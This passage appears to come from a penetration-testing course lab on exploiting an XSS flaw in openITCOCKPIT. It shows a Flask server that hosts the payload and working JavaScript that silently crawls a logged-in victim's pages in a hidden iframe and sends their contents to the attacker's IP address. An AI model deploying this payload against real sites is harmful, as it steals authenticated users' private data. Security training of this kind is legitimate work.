With the certificate and key generated, we will load them into the API application and specify the host and port to run on.

app.run(host='0.0.0.0', port=443, ssl_context=('cert.pem', 'key.pem'))
Listing 28 - Starting the Flask app

We'll enter the code in Listing 28 below the configuration of the app and database variables. This line will always be the last line of this script.

Now that the Flask server is set to run, we need to create some endpoints. The first endpoint will respond with the contents of client.js (the XSS payload) to allow the XSS to load our payload.

We'll use a Python decorator3 to set the route. Specifically, we'll set the name of the route and the method that will be allowed (GET). We will send the client.js file with Flask's send_file function.

The code for this is shown in Listing 29 and will be entered after the configuration of the app and database variables but before app.run is called:

@app.route('/client.js', methods=['GET'])
def clientjs():
    print("[+] Sending Payload")
    return send_file('./client.js', attachment_filename='client.js')
Listing 29 - Responding with client.js

Running the API with sudo python3 api.py should start the listener on port 443.

kali@kali:~/scripts$ sudo python3 api.py
 * Serving Flask app "api" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Running on https://0.0.0.0:443/ (Press CTRL+C to quit)
[+] Sending Payload
Listing 30 - Starting the API Server

Opening a browser to https://<Your Kali IP>/client.js and accepting the self-signed certificate should display the client.js file that we've created earlier. This URL will become the source of the payload for the XSS.

1
(Cory Dolphin, 2013), https://flask-cors.readthedocs.io/en/latest/ ↩︎

2
(Mozilla, 2020), <https://developer.mozilla.org/en-US/docs/Web/<http/CORS> ↩︎

3
(Hackers And Slackers, 2020), https://hackersandslackers.com/flask-routes/#defining-routes ↩︎

##### Scraping Content
Now that we have a web server to send our data to and a database to store the data, we need to finish the client.js script that targets the authenticated victim and will scrape the data they have access to. In addition to replacing the DOM with the fake login page that was created earlier, there will be four additional steps. Our script will:

Load the home page.
Search for all unique links and save their hrefs.
Fetch the content of each link.
Send the content obtained from each link to our API server.
At this point, we do not know the URL of the homepage for an authenticated user. However, since visiting the root of the application as an unauthenticated user redirects to a login page, we can assume the root of the application will redirect to an authenticated page if a session exists. While we will use XHR requests to fetch the content of each link we find, we don't want to use an XHR request on the home page since we don't know if the JavaScript sources running on the home page add additional links to the DOM after the page is loaded. Instead, we will use an iframe since it will load the page, follow any redirects, and render any JavaScript. Once the page is fully loaded, we can grab all the links that the authenticated user has access to.

In addition to loading the home page, there are a few additional important items to consider regarding loading the links we discover. First, we don't want to follow a link that will log out the current session. So we will avoid any links that contain the words "logout", "log-out", "signout", or "sign-out". Second, we don't want to scrape all links as soon as we open the iframe. We have already seen that openITCOCKPIT loads a lot of JavaScript. This JavaScript could load additional content after the HTML is rendered. To avoid this, we will wait a few seconds after the page is "loaded" to ensure that everything is added to the DOM.

We will add JavaScript beneath the existing client.js code that will create a full-page iframe element, set an onload action, and set the source of the page to the root of openITCOCKPIT. The JavaScript code for this is shown in Listing 31.

var iframe = document.createElement('iframe');
iframe.setAttribute("style","display:none")
iframe.onload = actions;
iframe.width = "100%"
iframe.height = "100%"
iframe.src = "https://openitcockpit"

body = document.getElementsByTagName('body')[0];
body.appendChild(iframe)
Listing 31 - Creating a homepage iframe

We don't want the victim to see the page loading, so we will set the style attribute to "display:none". Even though the iframe is not shown, the browser will still load the page.

The third line in Listing 31 references an actions function that does not currently exist. The actions function is the callback that defines the actions we want to perform when the page is loaded. As described earlier, we will wait five seconds to ensure that all content is fully loaded and added to the DOM. This might not be necessary, but in a black box scenario, it's better to exercise caution. After the delay, we will call the function that will grab the content we are looking for.

function actions(){
    setTimeout(function(){ getContent() }, 5000);
}
Listing 32 - Actions function

We are separating a lot of the actions into separate functions. This is not absolutely necessary but this will make the code more manageable when we add more functionality, especially in the Extra Mile exercise.

The actions function waits five seconds and calls getContent():

function getContent(){
}
Listing 33 - getContent definition

In getContent(), we will grab all the a elements from the iframe, extract all href tags from the a elements, remove all duplicate links, and check the validity of the href URL. When we grab all a elements the getElementsByTagName function will return a HTMLCollection. For further processing, we must convert the HTMLCollection to an Array:

allA = iframe.contentDocument.getElementsByTagName("a")

allHrefs = []
for (var i=0; i<allA.length; i++){
    allHrefs.push(allA[i].href)
}
Listing 34 - Grabbing all a elements

Next, we need to make sure that the array only contains unique values to reduce the traffic we are sending. The library we are currently exploiting for XSS, lodash, has a "unique" function that can handle this. To access this library, we will use the underscore (_) character.1 We'll pass the allHrefs array into the unique function and save the output into uniqueHrefs.

uniqueHrefs = _.unique(allHrefs)
Listing 35 - Obtaining only unique hrefs

Now that we have a list of all unique hrefs, we need to check if the href is a valid URL and remove any links that might log out the current user. In Listing 36, we first create a new array where we can store only the valid URLs. Next, we loop through the uniqueHrefs, run the href through a function(validURL) to check if the URL is valid and verify that it will not log out the target. The validURL function is not currently implemented and will be left as an exercise.

validUniqueHrefs = []
for(var i=0; i<uniqueHrefs.length; i++) {
    if (validURL(uniqueHrefs[i])){
        validUniqueHrefs.push(uniqueHrefs[i]);
    }
}
Listing 36 - Checking for valid URL

Next, we will send a GET request to each valid and unique href, encode the content, and send the content over to our API server. We will use the fetch method to make these requests.

The code block in Listing 37 will loop through each valid, unique href and GET the content. Since we don't want a user's browser to completely freeze during this operation, we'll run the request as an asynchronous task. The reason for using the fetch method is that will return a JavaScript promise.2 A promise handles asynchronous operations once they complete or fail. Instead of blocking the entire thread as the code executes, a function passed in to the promise will be executed once the operation is complete. This also allows us to tie multiple promises together to ensure one method only executes after another completes.

The promise returned by the fetch will be handled by .then and the response will be passed in as an argument to the function. The text from the response is obtained (which returns another promise) and passed into another .then function. Within the final .then function, the text is sent to our API server along with the source URL:

validUniqueHrefs.forEach(href =>{
    fetch(href, {
        "credentials": "include",
        "method": "GET",
    })
    .then((response) => {
      return response.text()
    })
    .then(function (text){
      fetch("https://192.168.119.120/content", {
        body: "url=" + encodeURIComponent(href) + "&content=" + encodeURIComponent(text),
        headers: {
          "Content-Type": "application/x-www-form-urlencoded"
        },
        method: "POST"
      })
    });
})
Listing 37 - Obtaining authenticated content

To recap, our JavaScript should now load the homepage (if the user is logged in) and scrape all links. The obtained links are then checked for validity and any logout links are removed. Finally, each link is visited in the background of the user's browser and the contents are forwarded to our API server for storage.

1
(Lodash, 2015), https://github.com/lodash/lodash/blob/1.3.1/doc/README.md#_uniqarray--issortedfalse-callbackidentity-thisarg ↩︎

2
(Mozilla, 2020), https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise ↩︎




